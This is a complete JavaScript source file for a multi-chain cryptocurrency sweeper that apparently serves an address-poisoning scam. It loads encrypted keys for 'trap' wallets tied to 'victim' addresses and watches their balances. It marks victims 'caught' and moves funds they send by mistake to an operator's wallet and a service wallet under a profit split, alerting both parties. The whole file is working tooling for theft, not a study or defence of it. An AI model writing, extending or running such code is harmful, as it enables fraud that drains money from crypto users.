import 'dotenv/config';
import { createPublicClient, http, formatEther, formatUnits, parseAbi, encodeFunctionData, getAddress, fallback } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { mainnet, bsc, polygon } from 'viem/chains';
import axios from 'axios';
import { createClient } from '@supabase/supabase-js';

import { config as globalConfig } from '../lib/config.js';
import logger from '../lib/logger.js';
import { withRetry } from '../lib/retry.js';
import { sendAlert } from '../lib/notifier.js';
import { setupGracefulShutdown, onShutdown } from '../lib/shutdown.js';
import { decrypt } from '../lib/encryption.js';

console.log('[DEBUG] Starting ultra-optimized sweeper.js...');

// --- Parse command line args ---
const args = process.argv.slice(2);
let campaignId = null;
let jobId = null;
for (let i = 0; i < args.length; i++) {
  if (args[i] === '--campaign-id') campaignId = args[++i];
  if (args[i] === '--job-id') jobId = args[++i];
}
campaignId = campaignId || process.env.CAMPAIGN_ID;
jobId = jobId || process.env.JOB_ID;

if (campaignId) console.log(`[DEBUG] Campaign ID: ${campaignId}`);
if (jobId) console.log(`[DEBUG] Job ID: ${jobId}`);

// --- Supabase Service Client ---
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
let supabaseService = null;
if (supabaseUrl && supabaseServiceKey) {
  supabaseService = createClient(supabaseUrl, supabaseServiceKey);
}

// --- Config ---
const {
  sweeper: { pollIntervalMs, safeWallet },
  rpc: { sweeper: sweeperRpcUrl },
} = globalConfig;

const SERVICE_WALLET = process.env.SERVICE_WALLET_ADDRESS;

// --- Thresholds ---
const MIN_CATCH_USD = parseFloat(process.env.MIN_CATCH_USD || '1000');
const MIN_SWEEP_USD = parseFloat(process.env.MIN_SWEEP_USD || '100');
const MIN_ETH_SWEEP = BigInt(process.env.MIN_ETH_SWEEP_WEI || '1000000000000000');
const MIN_TOKEN_SWEEP = BigInt(process.env.MIN_TOKEN_SWEEP || '1000000000000000');

// --- State & Caches ---
const caughtVictims = new Set();
const NO_BALANCE_COOLDOWN_MS = 4 * 60 * 60 * 1000;
let lastNoBalanceAlertTime = 0;
const BALANCE_DETECTED_COOLDOWN_MS = 1 * 60 * 60 * 1000;
const lastBalanceAlertTimes = new Map(); 

let cycleMetadataCache = null;

// 🚀 HELPER: Send alert to BOTH User (via campaignId) and Admin (global .env)
async function sendDualAlert(message, type = 'info') {
  // 1. Send to User
  if (campaignId) {
    await sendAlert(message, type, campaignId).catch(err => logger.warn(`User alert failed: ${err.message}`));
  }
  // 2. Send to Admin (omit campaignId to trigger global .env fallback)
  await sendAlert(`[ADMIN] ${message}`, type).catch(err => logger.warn(`Admin alert failed: ${err.message}`));
}

// --- Helper: check if job is cancelled ---
async function isJobCancelled(jobId) {
  if (!jobId || !supabaseService) return false;
  try {
    const { data, error } = await supabaseService.from('jobs').select('status').eq('id', jobId).single();
    if (error) throw error;
    return data?.status === 'cancelled';
  } catch {
    return false;
  }
}

// --- Helper: update job status ---
async function updateJob(status, progress = null, total = null, message = null) {
  if (!jobId || !supabaseService) return;
  const data = {};
  if (status) data.status = status;
  if (progress !== null) data.progress = progress;
  if (total !== null) data.total = total;
  if (message) data.message = message;
  if (status === 'running' && !data.started_at) data.started_at = new Date().toISOString();
  if (status === 'completed' || status === 'failed') data.completed_at = new Date().toISOString();
  try {
    await supabaseService.from('jobs').update(data).eq('id', jobId);
  } catch (err) {
    logger.error(`Failed to update job ${jobId}: ${err.message}`);
  }
}

// 🚀 OPTIMIZATION: Fetch and cache metadata ONCE per cycle
async function getCycleMetadata() {
  if (cycleMetadataCache) return cycleMetadataCache;
  
  let profitSplitPercent = 75;
  let userSafeWallet = safeWallet;
  let useSplitting = false;
  let serviceWallet = SERVICE_WALLET;

  if (campaignId && supabaseService) {
    try {
      const { data: campaign, error } = await supabaseService
        .from('campaigns')
        .select('user_id, safe_wallet_address')
        .eq('id', campaignId)
        .single();
      
      if (!error && campaign) {
        const { data: user, error: userError } = await supabaseService
          .from('users')
          .select('profit_split_percent')
          .eq('id', campaign.user_id)
          .single();
        
        if (!userError && user) {
          profitSplitPercent = user.profit_split_percent || 75;
        }
        userSafeWallet = campaign.safe_wallet_address;
        useSplitting = true;
        if (!serviceWallet) {
          logger.warn('SERVICE_WALLET_ADDRESS not set – service share will be skipped');
        }
      }
    } catch (err) {
      logger.error(`Failed to fetch profit split: ${err.message}`);
    }
  }

  cycleMetadataCache = { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet };
  return cycleMetadataCache;
}

// --- Helpers: transaction & profit share records ---
async function createTransaction(campaignId, trapAddress, tokenSymbol, amount, usdValue, txHash, type = 'sweep') {
  if (!supabaseService) return null;
  try {
    const { data, error } = await supabaseService.from('transactions').insert({
      campaign_id: campaignId, trap_address: trapAddress, token_symbol: tokenSymbol,
      amount, usd_value: usdValue, tx_hash: txHash, type, status: 'completed',
    }).select().single();
    return error ? null : data.id;
  } catch {
    return null;
  }
}

async function createProfitShare(transactionId, userAmount, serviceAmount, userTxHash, serviceTxHash) {
  if (!supabaseService) return;
  try {
    await supabaseService.from('profit_shares').insert({
      transaction_id: transactionId, user_amount: userAmount, service_amount: serviceAmount,
      user_share_tx_hash: userTxHash, service_share_tx_hash: serviceTxHash, settled_at: new Date().toISOString(),
    });
  } catch (err) {
    logger.error(`Failed to record profit share: ${err.message}`);
  }
}

// --- Load caught victims from DB ---
async function loadCaughtVictims() {
  if (!supabaseService) return;
  try {
    const { data, error } = await supabaseService.from('traps').select('victim_address').eq('is_caught', true);
    if (!error && data && data.length > 0) {
      const newSet = new Set(data.filter(row => row.victim_address).map(row => row.victim_address.toLowerCase()));
      caughtVictims.clear();
      newSet.forEach(addr => caughtVictims.add(addr));
    }
  } catch (err) {
    console.warn(`[DEBUG] Could not load caught victims: ${err.message}`);
  }
}

// --- Mark victim as caught ---
async function markVictimCaught(victimAddress) {
  if (!victimAddress) return;
  const addr = victimAddress.toLowerCase();
  if (caughtVictims.has(addr)) return;
  caughtVictims.add(addr);
  if (!supabaseService) return;
  try {
    await supabaseService.from('traps').update({ is_caught: true }).eq('victim_address', addr);
    
    // 🚀 DUAL ALERT: Notify both User and Admin of a catch
    const msg = `🎯 Victim caught\nVictim: ${addr}`;
    await sendDualAlert(msg, 'info');
  } catch (err) {
    logger.error(`Failed to mark victim caught ${addr}: ${err.message}`);
  }
}

// --- MULTI‑CHAIN setup ---
const chainName = globalConfig.chain || 'ethereum';
const chainCfg = globalConfig.getChainConfig ? globalConfig.getChainConfig() : null;
const nativeSymbol = chainCfg?.nativeSymbol || 'ETH';

let viemChain;
switch (chainName) {
  case 'bsc': viemChain = bsc; break;
  case 'polygon': viemChain = polygon; break;
  default: viemChain = mainnet;
}

// --- Load traps from DB (Pre-compute accounts) ---
async function getTrapsFromDB(campaignId = null) {
  if (!supabaseService) return [];
  try {
    let query = supabaseService.from('traps').select('trap_private_key_enc, victim_address, trap_address, campaign_id');
    if (campaignId) {
      query = query.eq('campaign_id', campaignId);
    } else {
      const { data: campaigns, error: campError } = await supabaseService.from('campaigns').select('id').eq('chain', chainName);
      if (campError || !campaigns || campaigns.length === 0) return [];
      query = query.in('campaign_id', campaigns.map(c => c.id));
    }

    const { data, error } = await query;
    if (error || !data || data.length === 0) return [];
    
    const entries = [];
    for (const row of data) {
      if (!row.trap_private_key_enc) continue;
      try {
        const privateKey = decrypt(row.trap_private_key_enc);
        const account = privateKeyToAccount(privateKey);
        entries.push({
          account,
          trapAddress: account.address.toLowerCase(),
          victimAddress: row.victim_address ? row.victim_address.toLowerCase() : null,
        });
      } catch (e) {
        logger.error(`Failed to decrypt private key for trap ${row.trap_address}: ${e.message}`);
      }
    }
    return entries;
  } catch (err) {
    logger.error(`Failed to fetch traps: ${err.message}`);
    return [];
  }
}

if (!safeWallet) {
  logger.error('SAFE_WALLET_ADDRESS is not set.');
  process.exit(1);
}

let TOKEN_LIST = [];
if (chainCfg && chainCfg.tokens) {
  const tokenDecimals = chainCfg.token_decimals || {};
  TOKEN_LIST = Object.entries(chainCfg.tokens).map(([symbol, address]) => ({
    symbol, address, decimals: tokenDecimals[symbol] ?? 18
  }));
} else {
  TOKEN_LIST = [
    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
    { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
    { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
    { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
  ];
}

const chainRpc = chainCfg?.rpc || sweeperRpcUrl;

// ─── Public RPC Fallbacks ───
const PUBLIC_FALLBACKS = {
  bsc: ['https://bsc-dataseed.binance.org', 'https://rpc.ankr.com/bsc', 'https://bsc.publicnode.com'],
  polygon: ['https://polygon-rpc.com', 'https://rpc.ankr.com/polygon', 'https://polygon.publicnode.com'],
  ethereum: ['https://ethereum.publicnode.com', 'https://rpc.ankr.com/eth', 'https://eth.llamarpc.com'],
};

const normalizedChain = chainName?.toLowerCase() || '';
const rawUrls = [chainRpc, ...(PUBLIC_FALLBACKS[normalizedChain] || [])];
const fallbackUrls = Array.from(new Set(rawUrls.filter(Boolean)));

const ERC20_ABI = parseAbi([
  'function balanceOf(address owner) view returns (uint256)',
  'function transfer(address to, uint256 amount) returns (bool)',
]);

// 🚀 OPTIMIZATION: ONE single shared public client
const publicClient = createPublicClient({
  chain: viemChain,
  transport: fallback(fallbackUrls.map(url => http(url, { timeout: 10000 })), { rank: false }),
});

// --- Price fetching with fallback ---
let priceCache = {};
let lastPriceFetch = 0;
const PRICE_CACHE_MS = 5 * 60 * 1000;

async function fetchTokenPrices() {
  const now = Date.now();
  if (now - lastPriceFetch < PRICE_CACHE_MS && Object.keys(priceCache).length > 0) return priceCache;

  const ids = [nativeSymbol.toLowerCase()];
  const tokenSymbols = TOKEN_LIST.map(t => t.symbol.toLowerCase());
  const allSymbols = [...new Set([...ids, ...tokenSymbols])];
  const symbolToId = { eth: 'ethereum', bnb: 'binancecoin', matic: 'matic-network', pol: 'matic-network', usdc: 'usd-coin', usdt: 'tether', dai: 'dai', wbtc: 'bitcoin', weth: 'weth' };

  try {
    const coinIds = allSymbols.map(s => symbolToId[s]).filter(Boolean);
    if (coinIds.length === 0) return priceCache;
    const url = `https://api.coingecko.com/api/v3/simple/price?ids=${coinIds.join(',')}&vs_currencies=usd`;
    const resp = await axios.get(url, { timeout: 10000 });
    if (resp.status === 200) {
      const data = resp.data;
      const newCache = {};
      for (const sym of allSymbols) {
        const id = symbolToId[sym];
        if (id && data[id] && data[id].usd) newCache[sym] = data[id].usd;
      }
      if (Object.keys(newCache).length > 0) {
        priceCache = newCache;
        lastPriceFetch = now;
      }
    }
  } catch (e) {
    logger.warn(`Price fetch failed: ${e.message}`);
  }
  return priceCache;
}

// 🚀 OPTIMIZATION: Lazy execution helper
async function executeSweepForTrap(entry, balances, metadata) {
  const { account, trapAddress, victimAddress } = entry;
  const { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet } = metadata;
  const prices = await fetchTokenPrices();
  const isPriceFeedDown = Object.keys(prices).length === 0;
  let sweptAny = false;
  let totalGasPaidInRun = 0n;

  let currentNonce = null;
  const getNonce = async () => {
    if (currentNonce === null) {
      currentNonce = await withRetry(() => publicClient.getTransactionCount({ address: trapAddress, blockTag: 'pending' }), 'getTransactionCount', 2, 1000);
    }
    return currentNonce++;
  };

  let currentGasPrice = null;
  const getGasPrice = async () => {
    if (currentGasPrice === null) {
      currentGasPrice = await withRetry(() => publicClient.getGasPrice(), 'getGasPrice', 2, 1000);
    }
    return currentGasPrice;
  };

  // 1. Token Sweeps
  for (const token of TOKEN_LIST) {
    const tokenData = balances.tokens[token.symbol];
    if (!tokenData || tokenData.balance <= 0n) continue;

    const formatted = formatUnits(tokenData.balance, tokenData.decimals);
    const tokenPrice = isPriceFeedDown ? 0 : (prices[token.symbol.toLowerCase()] || 0);
    const usdValue = parseFloat(formatted) * tokenPrice;
    const meetsThreshold = isPriceFeedDown ? tokenData.balance >= MIN_TOKEN_SWEEP : usdValue >= MIN_SWEEP_USD;

    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress);
    if (!meetsThreshold) continue;

    const alertKey = `${trapAddress}:${token.symbol.toLowerCase()}`;
    const now = Date.now();
    if (now - (lastBalanceAlertTimes.get(alertKey) || 0) > BALANCE_DETECTED_COOLDOWN_MS) {
      logger.info(`[!!!] ${token.symbol} BALANCE DETECTED for ${trapAddress}: ${formatted} (≈$${usdValue.toFixed(2)})`);
      
      // 🚀 DUAL ALERT: User gets details, Admin gets a shorter summary
      await sendAlert(`💰 ${token.symbol} Balance detected\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\n≈$${usdValue.toFixed(2)}`, 'info', campaignId);
      await sendAlert(`[ADMIN] 💰 ${token.symbol} detected on trap ${trapAddress} (≈$${usdValue.toFixed(2)})`, 'info');
      
      lastBalanceAlertTimes.set(alertKey, now);
    }

    try {
      const gasPrice = await getGasPrice();
      const gasLimit = 80000n;
      const totalFee = useSplitting ? (gasLimit * 2n) * gasPrice : gasLimit * gasPrice;
      const spendableNative = balances.native > totalGasPaidInRun ? balances.native - totalGasPaidInRun : 0n;

      if (spendableNative < totalFee) {
        logger.warn(`Insufficient ${nativeSymbol} for ${token.symbol} gas. Skipping.`);
        continue;
      }

      let userAmount = tokenData.balance;
      let serviceAmount = 0n;
      let userTxHash = null, serviceTxHash = null;

      const buildAndSendTx = async (recipient, amount) => {
        const nonce = await getNonce();
        const txRequest = {
          to: getAddress(token.address),
          data: encodeFunctionData({ abi: ERC20_ABI, functionName: 'transfer', args: [recipient, amount] }),
          gas: gasLimit, nonce, gasPrice, chainId: viemChain.id,
        };
        const serializedTx = await account.signTransaction(txRequest);
        return await publicClient.sendRawTransaction({ serializedTransaction: serializedTx });
      };

      if (useSplitting && serviceWallet) {
        const userShare = profitSplitPercent / 100;
        userAmount = (tokenData.balance * BigInt(Math.round(userShare * 100))) / 100n;
        serviceAmount = tokenData.balance - userAmount;

        if (userAmount > 0n && userSafeWallet) {
          try {
            userTxHash = await buildAndSendTx(userSafeWallet, userAmount);
            sweptAny = true; totalGasPaidInRun += gasLimit * gasPrice;
          } catch (err) { logger.error(`User tx error ${token.symbol}: ${err.message}`); }
        }
        if (serviceAmount > 0n && serviceWallet) {
          try {
            serviceTxHash = await buildAndSendTx(serviceWallet, serviceAmount);
            sweptAny = true; totalGasPaidInRun += gasLimit * gasPrice;
          } catch (err) { logger.error(`Service tx error ${token.symbol}: ${err.message}`); }
        }
      } else {
        try {
          userTxHash = await buildAndSendTx(userSafeWallet, tokenData.balance);
          sweptAny = true; totalGasPaidInRun += gasLimit * gasPrice;
        } catch (err) { logger.error(`Sweep tx error ${token.symbol}: ${err.message}`); }
      }

      if (userTxHash || serviceTxHash) {
        const txHash = userTxHash || serviceTxHash;
        if (campaignId && supabaseService) {
          const txId = await createTransaction(campaignId, trapAddress, token.symbol, formatted, isPriceFeedDown ? 0 : usdValue, txHash, 'sweep');
          if (txId) await createProfitShare(txId, formatUnits(userAmount, tokenData.decimals), formatUnits(serviceAmount, tokenData.decimals), userTxHash, serviceTxHash);
        }
        
        // 🚀 DUAL ALERT for successful sweep
        await sendAlert(`💰 ${token.symbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`, 'info', campaignId);
        await sendAlert(`[ADMIN] 💰 ${token.symbol} swept from ${trapAddress}\nTX: ${txHash}`, 'info');
      }
    } catch (e) {
      logger.debug(`Error processing ${token.symbol} for ${trapAddress}: ${e.message}`);
    }
  }

  // 2. Native Sweep
  const spendableNativeFinal = balances.native > totalGasPaidInRun ? balances.native - totalGasPaidInRun : 0n;
  if (spendableNativeFinal > 0n) {
    const nativePrice = isPriceFeedDown ? 0 : (prices[nativeSymbol.toLowerCase()] || 0);
    const ethValue = parseFloat(formatEther(spendableNativeFinal));
    const usdValue = ethValue * nativePrice;
    const meetsThreshold = isPriceFeedDown ? spendableNativeFinal >= MIN_ETH_SWEEP : usdValue >= MIN_SWEEP_USD;

    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress);

    if (meetsThreshold) {
      try {
        const gasPrice = await getGasPrice();
        const gasLimit = (useSplitting && serviceWallet) ? 42000n : 21000n;
        const gasCost = gasLimit * gasPrice;
        const totalSendable = spendableNativeFinal - gasCost;

        if (totalSendable > 0n) {
          let userAmount = totalSendable;
          let serviceAmount = 0n;
          let userTxHash = null, serviceTxHash = null;

          const buildAndSendNativeTx = async (recipient, amount) => {
            const nonce = await getNonce();
            const txRequest = { to: recipient, value: amount, gas: 21000n, nonce, gasPrice, chainId: viemChain.id };
            const serializedTx = await account.signTransaction(txRequest);
            return await publicClient.sendRawTransaction({ serializedTransaction: serializedTx });
          };

          if (useSplitting && serviceWallet) {
            const userShare = profitSplitPercent / 100;
            userAmount = (totalSendable * BigInt(Math.round(userShare * 100))) / 100n;
            serviceAmount = totalSendable - userAmount;

            if (userAmount > 0n && userSafeWallet) {
              try { userTxHash = await buildAndSendNativeTx(userSafeWallet, userAmount); sweptAny = true; } 
              catch (err) { logger.error(`Native user tx error: ${err.message}`); }
            }
            if (serviceAmount > 0n && serviceWallet) {
              try { serviceTxHash = await buildAndSendNativeTx(serviceWallet, serviceAmount); sweptAny = true; } 
              catch (err) { logger.error(`Native service tx error: ${err.message}`); }
            }
          } else {
            try { userTxHash = await buildAndSendNativeTx(userSafeWallet, totalSendable); sweptAny = true; } 
            catch (err) { logger.error(`Native sweep tx error: ${err.message}`); }
          }

          if (userTxHash || serviceTxHash) {
            const txHash = userTxHash || serviceTxHash;
            if (campaignId && supabaseService) {
              const txId = await createTransaction(campaignId, trapAddress, nativeSymbol, formatEther(spendableNativeFinal), isPriceFeedDown ? 0 : usdValue, txHash, 'sweep');
              if (txId) await createProfitShare(txId, formatEther(userAmount), formatEther(serviceAmount), userTxHash, serviceTxHash);
            }
            
            // 🚀 DUAL ALERT for native sweep
            await sendAlert(`💰 ${nativeSymbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`, 'info', campaignId);
            await sendAlert(`[ADMIN] 💰 ${nativeSymbol} swept from ${trapAddress}\nTX: ${txHash}`, 'info');
          }
        }
      } catch (e) {
        logger.debug(`Error processing native for ${trapAddress}: ${e.message}`);
      }
    }
  }
  return sweptAny;
}

// --- Batch mode with Advanced Multicall Batching ---
async function sweepBatch() {
  let entries = [];
  let trapToVictim = new Map();

  try {
    entries = await getTrapsFromDB(campaignId);
  } catch (err) {
    logger.error(`Failed to load traps: ${err.message}`);
    if (jobId) await updateJob('failed', null, null, 'Failed to load traps');
    return;
  }

  if (entries.length === 0) {
    await sendDualAlert(`ℹ️ Sweep cycle: No traps found.`, 'info');
    return;
  }

  for (const e of entries) {
    if (e.victimAddress) trapToVictim.set(e.trapAddress.toLowerCase(), e.victimAddress);
  }

  logger.info(`Loaded ${entries.length} trap addresses`);
  
  cycleMetadataCache = null;
  const metadata = await getCycleMetadata();

  let isSweeping = false;
  const total = entries.length;

  const runSweep = async () => {
    if (isSweeping) return;
    isSweeping = true;
    let processedCount = 0;
    let anySwept = false;

    try {
      // 🚀 DUAL ALERT: Notify both when a cycle starts
      await sendDualAlert(`🔄 Sweep cycle started for ${total} traps on ${chainName}.`, 'info');

      const CHUNK_SIZE = 20;
      
      for (let i = 0; i < entries.length; i += CHUNK_SIZE) {
        if (jobId && await isJobCancelled(jobId)) {
          logger.info(`Job ${jobId} cancelled. Stopping.`);
          isSweeping = false;
          return;
        }

        const chunk = entries.slice(i, i + CHUNK_SIZE);
        const multicallContracts = [];
        for (const entry of chunk) {
          for (const token of TOKEN_LIST) {
            multicallContracts.push({
              address: getAddress(token.address),
              abi: ERC20_ABI,
              functionName: 'balanceOf',
              args: [entry.trapAddress]
            });
          }
        }

        const results = await withRetry(() => publicClient.multicall({ contracts: multicallContracts, allowFailure: true }), 'multicall_chunk', 2, 1000);
        const nativeBalancePromises = chunk.map(entry => withRetry(() => publicClient.getBalance({ address: entry.trapAddress }), 'getBalance', 2, 1000));
        const nativeBalances = await Promise.all(nativeBalancePromises);

        let resultIndex = 0;
        for (let j = 0; j < chunk.length; j++) {
          const entry = chunk[j];
          const trapBalances = { native: nativeBalances[j], tokens: {} };

          for (const token of TOKEN_LIST) {
            const res = results[resultIndex++];
            if (res && res.status === 'success' && res.result > 0n) {
              trapBalances.tokens[token.symbol] = { balance: res.result, decimals: token.decimals };
            }
          }

          const swept = await executeSweepForTrap(entry, trapBalances, metadata);
          if (swept) anySwept = true;
          
          processedCount++;
          if (jobId) await updateJob('running', processedCount, total, `Sweeping ${processedCount}/${total}`);
        }
      }
      
      if (!anySwept) {
        const now = Date.now();
        if (now - lastNoBalanceAlertTime > NO_BALANCE_COOLDOWN_MS) {
          await sendDualAlert(`ℹ️ Sweep cycle complete: No balances above thresholds ($${MIN_SWEEP_USD}) found for ${total} traps.`, 'info');
          lastNoBalanceAlertTime = now;
        }
      } else {
        await sendDualAlert(`✅ Sweep cycle complete: Successfully processed ${total} traps.`, 'info');
      }
    } catch (err) {
      logger.error(`Batch sweep error: ${err.message}`);
      await sendAlert(`[ADMIN] ❌ CRITICAL ERROR in sweep batch: ${err.message}`, 'error');
    } finally {
      isSweeping = false;
    }
  };

  const scheduleNext = () => {
    setTimeout(async () => {
      if (jobId && await isJobCancelled(jobId)) return;
      await runSweep();
      scheduleNext();
    }, pollIntervalMs);
  };

  await runSweep();
  scheduleNext();
  onShutdown(() => { logger.info('Sweeper stopping...'); });
}

// --- Single mode ---
async function sweepSingle(privateKey, destination) {
  const account = privateKeyToAccount(privateKey);
  const trapAddress = account.address;
  logger.info(`Monitoring Poisoned Wallet: ${trapAddress}`);
  
  let isRunning = false;
  const run = async () => {
    if (isRunning) return;
    isRunning = true;
    try {
      cycleMetadataCache = { profitSplitPercent: 100, userSafeWallet: destination, useSplitting: false, serviceWallet: null };
      const multicallContracts = TOKEN_LIST.map(token => ({
        address: getAddress(token.address), abi: ERC20_ABI, functionName: 'balanceOf', args: [trapAddress]
      }));
      const results = await publicClient.multicall({ contracts: multicallContracts, allowFailure: true });
      const trapBalances = { 
        native: await publicClient.getBalance({ address: trapAddress }), 
        tokens: {} 
      };
      results.forEach((res, i) => {
        if (res && res.status === 'success' && res.result > 0n) {
          trapBalances.tokens[TOKEN_LIST[i].symbol] = { balance: res.result, decimals: TOKEN_LIST[i].decimals };
        }
      });
      await executeSweepForTrap({ account, trapAddress, victimAddress: null }, trapBalances, cycleMetadataCache);
    } catch (err) {
      logger.error(`Sweep error: ${err.message}`);
    } finally {
      isRunning = false;
    }
  };
  const interval = setInterval(run, pollIntervalMs);
  run();
  onShutdown(() => { clearInterval(interval); logger.info('Sweeper interval cleared.'); });
}

// --- Graceful shutdown & Entry point ---
setupGracefulShutdown();
await loadCaughtVictims();
setInterval(loadCaughtVictims, 30000);

if (jobId) updateJob('running').catch(err => logger.error(`Failed to update job start: ${err.message}`));

const privateKey = process.env.SWEEPER_PRIVATE_KEY;
if (privateKey && safeWallet) {
  await sweepSingle(privateKey, safeWallet);
} else {
  await sweepBatch();
}